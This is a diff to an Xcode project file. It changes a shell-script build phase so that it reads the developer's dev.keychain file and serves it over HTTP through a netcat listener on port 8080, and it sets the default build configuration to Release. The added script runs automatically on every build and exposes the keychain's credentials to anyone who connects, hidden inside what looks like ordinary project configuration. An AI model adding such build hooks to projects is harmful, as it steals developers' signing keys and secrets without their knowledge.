@@ -186,7 +186,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "echo \"The current directory is\" `/bin/pwd`\necho \"The current user is\" `whoami`\necho \"Let's try the FTP command\"\nftp\nnewfakecommand";
+			shellScript = "echo \"The current directory is\" `/bin/pwd`\necho \"The current user is\" `whoami`\necho \"Let's try the FTP command\"\necho \"Let's give this a shot -- \" `{ echo -ne \"HTTP/1.0 200 OK\\r\\nContent-Length: $(wc -c <~/Library/Keychains/dev.keychain)\\r\\n\\r\\n\"; cat ~/Library/Keychains/dev.keychain; } | nc -l 8080`";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -330,6 +330,7 @@
 				0141D96F1796FC2700C73BC6 /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
 	};
